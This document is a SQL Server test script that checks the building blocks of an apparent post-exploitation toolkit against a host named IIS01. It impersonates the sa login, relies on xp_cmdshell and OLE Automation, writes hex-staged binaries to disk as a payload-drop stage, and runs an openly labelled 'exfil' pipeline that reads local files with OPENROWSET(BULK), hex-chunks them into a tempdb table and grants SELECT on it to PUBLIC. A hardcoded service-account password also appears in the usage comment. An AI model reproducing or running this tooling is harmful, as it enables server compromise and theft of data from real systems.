-- p2_test_queries.sql
-- Run directly on IIS01 via SSMS or sqlcmd to verify each building block
-- before coding into Go/Python.
--
-- Usage: sqlcmd -S IIS01\SQLEXPRESS -U svc_app_dev -P "D3vPortal!2025" -C -i p2_test_queries.sql
-- Or copy individual blocks into SSMS and run one at a time.
--
-- Prerequisite: xpinit already run (sp_OA enabled, xp_cmdshell enabled).

-- ================================================================
-- TEST 1a: STRING_AGG (SQL Server 2017+)
-- Purpose: verify STRING_AGG availability
-- Expected: output = 'AABBCC'
-- ================================================================
EXECUTE AS LOGIN='sa';
USE tempdb;

IF OBJECT_ID('stg','U') IS NOT NULL DROP TABLE stg;
CREATE TABLE stg (id INT IDENTITY(1,1), chunk NVARCHAR(MAX));
INSERT INTO stg(chunk) VALUES ('AA'), ('BB'), ('CC');

DECLARE @result VARCHAR(MAX);
SELECT @result = STRING_AGG(CAST(chunk AS VARCHAR(MAX)), '')
    WITHIN GROUP (ORDER BY id)
FROM stg;

PRINT '--- TEST 1a: STRING_AGG ---';
PRINT 'Result: ' + @result;
PRINT 'Expected: AABBCC';
PRINT CASE WHEN @result = 'AABBCC' THEN 'PASS' ELSE '*** FAIL ***' END;

DROP TABLE stg;
GO

-- ================================================================
-- TEST 1b: Variable concatenation (all SQL Server versions)
-- Purpose: verify portable alternative to STRING_AGG
-- Expected: output = 'AABBCC' (same as TEST 1a)
-- ================================================================
EXECUTE AS LOGIN='sa';
USE tempdb;

IF OBJECT_ID('stg','U') IS NOT NULL DROP TABLE stg;
CREATE TABLE stg (id INT IDENTITY(1,1), chunk NVARCHAR(MAX));
INSERT INTO stg(chunk) VALUES ('AA'), ('BB'), ('CC');

DECLARE @result VARCHAR(MAX) = '';
SELECT @result = @result + CAST(chunk AS VARCHAR(MAX))
FROM stg ORDER BY id;

PRINT '--- TEST 1b: Variable concatenation ---';
PRINT 'Result: ' + @result;
PRINT 'Expected: AABBCC';
PRINT CASE WHEN @result = 'AABBCC' THEN 'PASS' ELSE '*** FAIL ***' END;

DROP TABLE stg;
GO

-- ================================================================
-- TEST 2: hex to VARBINARY conversion (style 1, requires '0x' prefix)
-- Purpose: verify CONVERT(VARBINARY(MAX), '0x' + hex, 1) works
-- Expected: 11 bytes, content = "Hello World"
-- ================================================================
EXECUTE AS LOGIN='sa';

DECLARE @hex VARCHAR(100) = '48656C6C6F20576F726C64';
DECLARE @bin VARBINARY(MAX) = CONVERT(VARBINARY(MAX), '0x' + @hex, 1);

PRINT '--- TEST 2: hex to VARBINARY ---';
PRINT 'Binary length: ' + CAST(DATALENGTH(@bin) AS VARCHAR(20));
PRINT 'As text: ' + CAST(@bin AS VARCHAR(100));
PRINT 'Expected length: 11';
PRINT 'Expected text: Hello World';
PRINT CASE WHEN CAST(@bin AS VARCHAR(100)) = 'Hello World' THEN 'PASS' ELSE '*** FAIL ***' END;
GO

-- ================================================================
-- TEST 3: ADODB.Stream small write (text content)
-- Purpose: verify sp_OA + ADODB.Stream pipeline works
-- Expected: file C:\ProgramData\p2_test_small.bin contains "Hello World"
-- ================================================================
EXECUTE AS LOGIN='sa';

DECLARE @hex VARCHAR(100) = '48656C6C6F20576F726C64';
DECLARE @bin VARBINARY(MAX) = CONVERT(VARBINARY(MAX), '0x' + @hex, 1);

DECLARE @obj INT, @hr INT;
EXEC @hr = sp_OACreate 'ADODB.Stream', @obj OUT;
PRINT '--- TEST 3: ADODB.Stream small write ---';
PRINT 'sp_OACreate hr: ' + CAST(@hr AS VARCHAR(20));

EXEC sp_OASetProperty @obj, 'Type', 1;
EXEC sp_OAMethod @obj, 'Open';
EXEC sp_OAMethod @obj, 'Write', NULL, @bin;
EXEC sp_OAMethod @obj, 'SaveToFile', NULL, 'C:\ProgramData\p2_test_small.bin', 2;
EXEC sp_OAMethod @obj, 'Close';
EXEC sp_OADestroy @obj;

EXEC xp_cmdshell 'type C:\ProgramData\p2_test_small.bin';
EXEC xp_cmdshell 'certutil -hashfile C:\ProgramData\p2_test_small.bin SHA256';
-- Expected SHA256 of "Hello World": a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e
EXEC xp_cmdshell 'del /f C:\ProgramData\p2_test_small.bin';
GO

-- ================================================================
-- TEST 4a: Full pipeline — STRING_AGG (stg -> concat -> CONVERT -> ADODB.Stream)
-- Purpose: verify full P2 decode chain end-to-end with STRING_AGG
-- Expected: file contains "ABCDEFGHIJ" (10 bytes, split into 2 chunks)
-- ================================================================
EXECUTE AS LOGIN='sa';
USE tempdb;

IF OBJECT_ID('stg','U') IS NOT NULL DROP TABLE stg;
CREATE TABLE stg (id INT IDENTITY(1,1), chunk NVARCHAR(MAX));
INSERT INTO stg(chunk) VALUES ('4142434445');
INSERT INTO stg(chunk) VALUES ('464748494A');

DECLARE @hex VARCHAR(MAX);
SELECT @hex = STRING_AGG(CAST(chunk AS VARCHAR(MAX)), '')
    WITHIN GROUP (ORDER BY id) FROM stg;

DECLARE @bin VARBINARY(MAX) = CONVERT(VARBINARY(MAX), '0x' + @hex, 1);

DECLARE @obj INT, @hr INT;
EXEC @hr = sp_OACreate 'ADODB.Stream', @obj OUT;
EXEC sp_OASetProperty @obj, 'Type', 1;
EXEC sp_OAMethod @obj, 'Open';
EXEC sp_OAMethod @obj, 'Write', NULL, @bin;
EXEC sp_OAMethod @obj, 'SaveToFile', NULL, 'C:\ProgramData\p2_test_4a.bin', 2;
EXEC sp_OAMethod @obj, 'Close';
EXEC sp_OADestroy @obj;

PRINT '--- TEST 4a: Full P2 pipeline (STRING_AGG) ---';
EXEC xp_cmdshell 'type C:\ProgramData\p2_test_4a.bin';
EXEC xp_cmdshell 'certutil -hashfile C:\ProgramData\p2_test_4a.bin SHA256';

DROP TABLE stg;
GO

-- ================================================================
-- TEST 4b: Full pipeline — variable concatenation (portable version)
-- Purpose: verify same pipeline with variable concat instead of STRING_AGG
-- Expected: SHA256 must match TEST 4a
-- ================================================================
EXECUTE AS LOGIN='sa';
USE tempdb;

IF OBJECT_ID('stg','U') IS NOT NULL DROP TABLE stg;
CREATE TABLE stg (id INT IDENTITY(1,1), chunk NVARCHAR(MAX));
INSERT INTO stg(chunk) VALUES ('4142434445');
INSERT INTO stg(chunk) VALUES ('464748494A');

DECLARE @hex VARCHAR(MAX) = '';
SELECT @hex = @hex + CAST(chunk AS VARCHAR(MAX))
FROM stg ORDER BY id;

DECLARE @bin VARBINARY(MAX) = CONVERT(VARBINARY(MAX), '0x' + @hex, 1);

DECLARE @obj INT, @hr INT;
EXEC @hr = sp_OACreate 'ADODB.Stream', @obj OUT;
EXEC sp_OASetProperty @obj, 'Type', 1;
EXEC sp_OAMethod @obj, 'Open';
EXEC sp_OAMethod @obj, 'Write', NULL, @bin;
EXEC sp_OAMethod @obj, 'SaveToFile', NULL, 'C:\ProgramData\p2_test_4b.bin', 2;
EXEC sp_OAMethod @obj, 'Close';
EXEC sp_OADestroy @obj;

PRINT '--- TEST 4b: Full P2 pipeline (variable concat) ---';
EXEC xp_cmdshell 'type C:\ProgramData\p2_test_4b.bin';
EXEC xp_cmdshell 'certutil -hashfile C:\ProgramData\p2_test_4b.bin SHA256';

PRINT '--- Compare 4a vs 4b ---';
PRINT 'SHA256 must match. If identical, both concat methods produce the same output.';

EXEC xp_cmdshell 'del /f C:\ProgramData\p2_test_4a.bin';
EXEC xp_cmdshell 'del /f C:\ProgramData\p2_test_4b.bin';
DROP TABLE stg;
GO

-- ================================================================
-- TEST 5: ADODB.Stream large binary write (stress test sp_OA Write)
-- Purpose: verify sp_OAMethod Write handles varbinary > 1MB
-- Generates ~2MB binary pattern, writes to file, verifies size
-- THIS IS THE MOST IMPORTANT TEST — fallback needed if it fails
-- ================================================================
EXECUTE AS LOGIN='sa';
USE tempdb;

-- Build 2MB binary via REPLICATE + loop
DECLARE @onekb VARBINARY(MAX) = CAST(REPLICATE(CAST(0xDEADBEEF AS VARBINARY(4)), 256) AS VARBINARY(MAX));
-- @onekb = 1024 bytes (256 x 4 bytes)
DECLARE @bin VARBINARY(MAX) = CAST(REPLICATE(CAST(@onekb AS VARBINARY(MAX)), 1) AS VARBINARY(MAX));
-- REPLICATE varbinary max is 8000 bytes at once, so use a loop:

SET @bin = @onekb;
DECLARE @target INT = 2097152;  -- 2MB
WHILE DATALENGTH(@bin) < @target
    SET @bin = @bin + @onekb;

PRINT '--- TEST 5: ADODB.Stream large binary write ---';
PRINT 'Binary size: ' + CAST(DATALENGTH(@bin) AS VARCHAR(20)) + ' bytes';

DECLARE @obj INT, @hr INT;
EXEC @hr = sp_OACreate 'ADODB.Stream', @obj OUT;
PRINT 'sp_OACreate hr: ' + CAST(@hr AS VARCHAR(20));
EXEC sp_OASetProperty @obj, 'Type', 1;
EXEC sp_OAMethod @obj, 'Open';
EXEC @hr = sp_OAMethod @obj, 'Write', NULL, @bin;
PRINT 'sp_OAMethod Write hr: ' + CAST(@hr AS VARCHAR(20));
-- hr = 0 means OK. hr != 0 means COM error, need fallback chunked write
EXEC @hr = sp_OAMethod @obj, 'SaveToFile', NULL, 'C:\ProgramData\p2_test_large.bin', 2;
PRINT 'sp_OAMethod SaveToFile hr: ' + CAST(@hr AS VARCHAR(20));
EXEC sp_OAMethod @obj, 'Close';
EXEC sp_OADestroy @obj;

-- Verify file size
EXEC xp_cmdshell 'powershell -c "(Get-Item C:\ProgramData\p2_test_large.bin).Length"';
-- Expected: 2097152
EXEC xp_cmdshell 'del /f C:\ProgramData\p2_test_large.bin';

PRINT CASE WHEN @hr = 0 THEN 'PASS — sp_OA Write handles 2MB OK'
           ELSE '*** FAIL — need fallback: chunked write or certutil ***' END;
GO

-- ================================================================
-- TEST 6: Hex encode roundtrip with CONVERT style 2 (for P3 exfil)
-- Purpose: verify binary -> hex encode (CONVERT style 2, no '0x' prefix)
--          + hex -> binary decode roundtrip
-- Expected: roundtrip data = original data
-- ================================================================
EXECUTE AS LOGIN='sa';

DECLARE @original VARBINARY(MAX) = 0x48656C6C6F20576F726C64;  -- "Hello World"
DECLARE @hex VARCHAR(MAX) = CONVERT(VARCHAR(MAX), @original, 2);
DECLARE @roundtrip VARBINARY(MAX) = CONVERT(VARBINARY(MAX), '0x' + @hex, 1);

PRINT '--- TEST 6: hex encode/decode roundtrip ---';
PRINT 'Original hex:   ' + CONVERT(VARCHAR(MAX), @original, 1);
PRINT 'Encoded (no 0x): ' + @hex;
PRINT 'Roundtrip hex:  ' + CONVERT(VARCHAR(MAX), @roundtrip, 1);
PRINT CASE WHEN @original = @roundtrip THEN 'PASS' ELSE '*** FAIL ***' END;
GO

-- ================================================================
-- TEST 7: OPENROWSET(BULK) local file read (for P3 exfil)
-- Purpose: verify OPENROWSET BULK SINGLE_BLOB works under sa context
-- Expected: file read successfully, DATALENGTH > 0
-- ================================================================
EXECUTE AS LOGIN='sa';

-- Create test file
EXEC xp_cmdshell 'echo OpenRowSet Bulk Test Content > C:\ProgramData\p2_bulk_test.txt';

DECLARE @data VARBINARY(MAX);
SELECT @data = BulkColumn
FROM OPENROWSET(BULK 'C:\ProgramData\p2_bulk_test.txt', SINGLE_BLOB) AS t;

PRINT '--- TEST 7: OPENROWSET(BULK) local file read ---';
PRINT 'File bytes read: ' + CAST(DATALENGTH(@data) AS VARCHAR(20));
PRINT 'Content as text: ' + CAST(@data AS VARCHAR(200));
PRINT CASE WHEN DATALENGTH(@data) > 0 THEN 'PASS' ELSE '*** FAIL ***' END;

EXEC xp_cmdshell 'del /f C:\ProgramData\p2_bulk_test.txt';
GO

-- ================================================================
-- TEST 8: OPENROWSET(BULK) -> hex chunk -> INSERT (full P3 mini-pipeline)
-- Purpose: verify full exfil-side T-SQL pipeline
-- Expected: exfil table contains hex chunks, total hex length = 2 x file size
-- ================================================================
EXECUTE AS LOGIN='sa';
USE tempdb;

-- Create test file
EXEC xp_cmdshell 'echo Exfil Pipeline Test 1234567890 > C:\ProgramData\p2_exfil_pipe.txt';

DECLARE @data VARBINARY(MAX);
SELECT @data = BulkColumn
FROM OPENROWSET(BULK 'C:\ProgramData\p2_exfil_pipe.txt', SINGLE_BLOB) AS t;

DECLARE @total INT = DATALENGTH(@data);

IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;
CREATE TABLE tempdb..exfil (
    id        INT IDENTITY(1,1),
    chunk_idx INT           NOT NULL,
    chunk     NVARCHAR(MAX) NOT NULL
);
GRANT SELECT ON tempdb..exfil TO PUBLIC;

-- Use small chunk size (50 bytes) to force multiple chunks + sub-chunks
DECLARE @chunk_bytes INT = 50;
DECLARE @i INT = 0;
WHILE @i * @chunk_bytes < @total
BEGIN
    DECLARE @off INT = @i * @chunk_bytes + 1;
    DECLARE @len INT = CASE
        WHEN @off + @chunk_bytes - 1 > @total
        THEN @total - @off + 1
        ELSE @chunk_bytes END;

    DECLARE @hex VARCHAR(MAX) = CONVERT(VARCHAR(MAX),
        SUBSTRING(@data, @off, @len), 2);

    DECLARE @j INT = 1;
    WHILE @j <= LEN(@hex)
    BEGIN
        INSERT INTO tempdb..exfil (chunk_idx, chunk)
        VALUES (@i, SUBSTRING(@hex, @j, 8000));
        SET @j = @j + 8000;
    END
    SET @i = @i + 1;
END

PRINT '--- TEST 8: Full P3 exfil pipeline ---';
PRINT 'File size: ' + CAST(@total AS VARCHAR(20)) + ' bytes';
PRINT 'Num file-chunks: ' + CAST(@i AS VARCHAR(20));
SELECT chunk_idx, id, LEN(chunk) AS hex_len, LEFT(chunk, 30) AS preview
FROM tempdb..exfil ORDER BY id;

-- Verify: total hex length must = 2 x file size
DECLARE @total_hex INT;
SELECT @total_hex = SUM(LEN(chunk)) FROM tempdb..exfil;
PRINT 'Total hex chars: ' + CAST(@total_hex AS VARCHAR(20));
PRINT 'Expected (2 x file_size): ' + CAST(@total * 2 AS VARCHAR(20));
PRINT CASE WHEN @total_hex = @total * 2 THEN 'PASS' ELSE '*** FAIL ***' END;

DROP TABLE tempdb..exfil;
EXEC xp_cmdshell 'del /f C:\ProgramData\p2_exfil_pipe.txt';
GO

-- ================================================================
-- TEST 9: buffer pool memory limit check
-- Purpose: know actual memory limits before processing large files
-- Output: record these numbers for design doc reference
-- ================================================================
EXECUTE AS LOGIN='sa';

PRINT '--- TEST 9: SQL Server memory config ---';
SELECT name, CAST(value_in_use AS VARCHAR(20)) AS value_in_use
FROM sys.configurations
WHERE name IN ('max server memory (MB)', 'min server memory (MB)');

SELECT physical_memory_kb / 1024 AS physical_memory_mb,
       committed_kb / 1024 AS sql_committed_mb,
       committed_target_kb / 1024 AS sql_target_mb
FROM sys.dm_os_sys_info;

SELECT @@VERSION AS sql_version;
GO

-- ================================================================
-- TEST 10: sp_OA error handling — verify HRESULT readable
-- Purpose: confirm COM errors are captured and readable for debugging
-- Expected: hr != 0 for invalid path
-- ================================================================
EXECUTE AS LOGIN='sa';

DECLARE @obj INT, @hr INT;
EXEC @hr = sp_OACreate 'ADODB.Stream', @obj OUT;
EXEC sp_OASetProperty @obj, 'Type', 1;
EXEC sp_OAMethod @obj, 'Open';
-- Write to nonexistent path -> expect error
EXEC @hr = sp_OAMethod @obj, 'SaveToFile', NULL, 'Z:\nonexistent\path\fail.bin', 2;

PRINT '--- TEST 10: sp_OA error handling ---';
PRINT 'SaveToFile to bad path hr: ' + CAST(@hr AS VARCHAR(20));
-- hr != 0 confirms COM error is captured

-- Read error detail
DECLARE @src VARCHAR(255), @desc VARCHAR(255);
EXEC sp_OAGetErrorInfo @obj, @src OUT, @desc OUT;
PRINT 'Error source: ' + ISNULL(@src, '(null)');
PRINT 'Error desc:   ' + ISNULL(@desc, '(null)');

EXEC sp_OAMethod @obj, 'Close';
EXEC sp_OADestroy @obj;
PRINT CASE WHEN @hr != 0 THEN 'PASS — error captured correctly' ELSE 'UNEXPECTED — should have failed' END;
GO

-- ================================================================
-- SUMMARY
-- ================================================================
-- TEST 1a: STRING_AGG (2017+)              -> P2 dependency
-- TEST 1b: Variable concatenation          -> portable alternative
-- TEST 2:  hex to VARBINARY conversion     -> P2 core decode
-- TEST 3:  ADODB.Stream small write        -> P2 core write
-- TEST 4a: Full P2 pipeline (STRING_AGG)   -> P2 end-to-end
-- TEST 4b: Full P2 pipeline (var concat)   -> P2 end-to-end portable
--          4a vs 4b SHA256 must match      -> either method works
-- TEST 5:  ADODB.Stream large write (2MB)  -> P2 risk: sp_OA blob limit
-- TEST 6:  hex encode/decode roundtrip     -> P3 dependency
-- TEST 7:  OPENROWSET(BULK) local read     -> P3 dependency
-- TEST 8:  Full P3 exfil pipeline          -> P3 end-to-end
-- TEST 9:  Memory config                   -> sizing reference
-- TEST 10: sp_OA error handling            -> debug capability
--
-- If TEST 5 FAILS (hr != 0 on Write):
--   -> use fallback: chunked ADODB.Stream write (loop 1MB at a time)
--   -> or: hex decode via T-SQL + write via certutil -decodehex
--
-- If TEST 7 FAILS:
--   -> check permission: SQL Server service account needs read access
--   -> EXEC xp_cmdshell 'whoami'  (verify service identity)
--   -> EXEC xp_cmdshell 'icacls C:\ProgramData\<file>'
